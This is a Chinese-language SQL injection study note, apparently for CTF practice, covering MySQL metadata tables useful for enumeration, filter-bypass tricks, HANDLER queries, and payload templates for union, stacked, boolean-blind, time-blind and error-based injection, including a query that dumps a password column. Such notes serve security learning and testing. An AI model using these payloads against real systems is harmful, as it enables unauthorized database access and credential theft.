---
title: SQL注入
category: SQL注入
---

#  SQL注入中的可利用的库表和列

`information_schema.tables` *所有库和表的统计*

    table_schema  
    table_name  
`information_schema.columns` *包含库名，表名，列名*

    table_schema 
    table_name
    column_name
`mysql.innodb_table_stats`

     table_name 
     database_name

`mysql.innodb_index_stats` 
    
    table_name 
    database_name
`sys.schema_table_statistics` 

    table_schema 
    table_name
`sys.schema_table_statistics_with_buffer` 

    table_schema 
    table_name
`sys.schema_auto_increment_columns` 

    table_schema 
    table_name


# 注入前的基本功

## 何种注入类型
主要分为字符型注入和数字型注入

在注入点用单引号双引号或单纯数字测试即可得出

## 基础语法

SQL语句的注释有 

`#`

 `--`

 `/*.....*/`

 ---


`limit` 来获取想要的数据

`select a from b limit 0,2`

从第一行开始获取前两行的数据



## 查询的表有多少列

在已经有注入点的前提下，利用`union`或者`order by`来判断列数

`select a from b union select 1,2,3;`

因为`union`要求上下两张表的列数相同，不同时则报错

---

`select a from b order by 1;`

`order by`的作用是将查询的表根据某一列来排序，当需要用来排序的那一列不存在的时候就会报错


##  关键字黑名单的绕过
   1. Tab和()可以用来代替空格
   2. 单次删除关键字可以采用双写绕过
   3. 多次删除关键字可以大小写并用来绕过
   4. 利用内联注释，即 `/*.....*/`也可以绕过部分关键字检测
   5. 利用`handler`来获取表的数据
   6. `=`的过滤可以用`in()`和`like`来代替
   7. `ascii()`的过滤可以用`hex()`,`ord()`等等来代替，本质是将字符转为数值
   

## handler的使用

    HANDLER tbl_name OPEN [ [AS] alias]
 
    HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
        [ WHERE where_condition ] [LIMIT ... ]
    HANDLER tbl_name READ { FIRST | NEXT }
        [ WHERE where_condition ] [LIMIT ... ]
    
    HANDLER tbl_name CLOSE

    通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。
    通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。
    通过HANDLER tbl_name CLOSE来关闭打开的句柄。

    通过索引去查看的话可以按照一定的顺序，获取表中的数据。
    通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。

    通过索引列指定一个值，可以指定从哪一行开始。
    通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。



`handler`常见于过滤`selcet`的注入

```sql
handler a open;handler a read first;

```


# 判断采用何种注入方法
## 联合注入

最简单的一种注入，利用`union`进行联合查询,

`select a from b union select c from d;`

当使用这种查询语句时，将会返回两张表，即a和c

a是已经固定查询的，`union`后面的就是我们的操作空间

```sql
首先，判断列数，假设是三列
select a from b union select 1,2,3,4;
则在此时报错，我们得知是三列

获取关键信息，例如获取当前库下的所有表名
select a from b union select 1,2,group_concat(table_name) from infromation_schema.tables where table_schema=database();

从已知表名获取列名，假设我们已得知一表名为'TA'
select a from b union select 1,2,group_concat(column_name) from infromation_schema.columns where table_name='TA';

获取数据，假设我们得知列名为'passwd'
select a from b union select 1,2,group_concat(passwd) from TA;
```

## 堆叠注入

所谓堆叠注入，即执行多条SQL语句

`select a from b;show databases;`

是相当容易的注入，自然也极少出现

一旦出现堆叠注入，我们可以执行相当多的命令，插入删除等等

## 布尔盲注

存在测试点，但不返回查询结果，仅返回1或0，即可采用布尔盲注

比方说一个注入点，当我们输入正确值和错误值时返回的数据包长度不同

那么反复试错便可得到我们想要的数据，就像爆破密码一样

`select a from b and c;`

对于上面这句SQL语句，如果c大于0，那么语句会正常执行，否则不执行

在利用时，不止有`and`，`or`等等也能够用来布尔盲注



在布尔盲注中，常用的函数有如下

    ascii(str) , 返回字符的ascii码值
    length(str) , 返回字符串长度
    left(str, len) , 返回从字符串左边开始一定长度的子字符串
    right(str, len) , 返回从字符串右边开始一定长度的子字符串
    substr(str, pos [,len]) , 从字符串某处开始截取到最后或一定长度
        注意，str第一个字符的标号是1不是0，截取时包含pos所指的字符
        pos可以取负数，取负则从右边开始数，但还是往右边截取
    mid(str, pos [,len]), 效果同substr()

    
## 时间盲注

时间盲注与布尔盲注大同小异

对于一个注入点，无论如何注入都返回相同的内容，那么我们就可以尝试时间盲注

时间盲注要求使用`sleep()`函数

常见的有`select a from b and if(length(database())>5, 1, sleep(5));`

    if(expr1, expr2, expr3) , 如果expr1成立， 返回expr2, 否则返回expr3

通过数据包的返回时间来盲注

## 报错注入

网站页面会将SQL查询语句的报错信息返回到用户界面，此时即可报错注入

常见的有

    and extractvalue(1, concat(0x7e, (payload), 0x7e));
    payload中的数据将会以报错的语句出现，

    and updatexml(1, concat(0x7e, (payload), 0x7e), 1);

[更具体的参考此处](https://cloud.tencent.com/developer/article/1630134)

## 无列名注入



# 尚在更新中

